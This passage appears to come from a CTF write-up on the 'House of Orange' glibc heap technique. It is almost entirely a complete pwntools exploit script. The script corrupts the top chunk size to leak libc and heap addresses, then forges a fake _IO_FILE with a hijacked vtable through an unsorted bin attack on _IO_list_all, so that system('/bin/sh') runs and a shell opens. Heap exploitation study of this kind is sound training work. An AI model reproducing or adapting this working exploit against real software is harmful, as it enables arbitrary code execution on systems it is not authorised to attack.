            malloc_printerr (check_action, "malloc(): memory corruption",// 执行该函数
                             chunk2mem (victim), av);
          size = chunksize (victim);
```



```python
sl('1') #get shell
```




## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'houseoforange'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
#libFile = './libc64-2.19.so'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('Your choice : ', str(1))
	sla('name :', str(size))
	sa('Name :', data)
	sla('Price of Orange:', str(16))
	sla('Orange:', '1');


def md(size, data):
	sla('Your choice : ', str(3))
	sla('name :', str(size))
	sa('Name:', data)
	sla('Price of Orange:', str(16))
	sla('Orange:', '1');

def dp():
	sla('Your choice : ', str(2))

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	main_arena = 0x3c4b20
	
	ad(0x10, 'A' * 0x10)
	p = 'A' * 0x10
	p += p64(0) + p64(0x21)
	p += p64(0x1f00000010)
	p += p64(0)
	p += p64(0)
	p += p64(0x00fa1)
	# top chunk size 0x20fa1
	# top chunk addr 0x555555758060
	# alignment: 555555779001 -> 0x1000
	li('addr: ' + hex(0xfa1 + 0x1000))
	md(0x80, p)

	ad(0x1000, 'B' * 0x10)

	# leak libc base with overflow
	ad(0x400, 'C' * 0x8)

	dp()
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - main_arena - 1640
	li('libc_base ' + hex(lib.address))

	# leak heap addr with large bin
	md(0x10, 'C' * 0x10)
	dp()
	ru('CCCCCCCCCCCCCCCC')
	heap = u64(ru('\x0a').ljust(8, '\x00')) - 0xc0
	li('heap ' + hex(heap))

	_IO_list_all = lib.sym['_IO_list_all']
	li('_IO_list_all ' + hex(_IO_list_all))

	# Control program
	p = 'B' * 0x400
	p += p64(0)
	p += p64(0x21)
	p += 'B' * 0x10

	# fake file
	f = '/bin/sh\x00' # flag overflow arg -> system('/bin/sh')
	f += p64(0x61)    # _IO_read_ptr small bin size
	#  unsoted bin attack
	f += p64(0) # _IO_read_end)
	f += p64(_IO_list_all - 0x10)  # _IO_read_base

	#bypass check
	# fp->_IO_write_base < fp->_IO_write_ptr

	# fp->mode <=0 ((addr + 0xc8) <= 0)
	f += p64(0) # _IO_write_base 
	f += p64(1) # _IO_write_ptr

	f += p64(0) # _IO_write_end
	f += p64(0) # _IO_buf_base
	f += p64(0) # _IO_buf_end
	f += p64(0) # _IO_save_base
	f += p64(0) # _IO_backup_base
	f += p64(0) # _IO_save_end
	f += p64(0) # *_markers
	f += p64(0) # *_chain

	f += p32(0) # _fileno
	f += p32(0) # _flags2

	f += p64(1)  # _old_offset

	f += p16(2) # ushort _cur_colum;
	f += p8(3)  # char _vtable_offset
	f += p8(4)  # char _shrotbuf[1]
	f += p32(0) # null for alignment

	f += p64(0) # _offset
	f += p64(6) # _codecvt
	f += p64(0) # _wide_data
	f += p64(0) # _freeres_list
	f += p64(0) # _freeres_buf

	f += p64(0) # __pad5
	f += p32(0) # _mode
	f += p32(0) # _unused2

	#f = f.ljust(0xc0, '\x00')

	p += f
	p += p64(0) * 3 # alignment to vtable
	p += p64(heap + 0x5C8) # vtable
	p += p64(0) * 2

	p += p64(lib.sym['system']) # 
	md(0x600, p)

	db()
	sl('1') #get shell

	# malloc(0x10) -> malloc_printerr -> overflow(IO_FILE addr) -> system('/bin/sh')



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

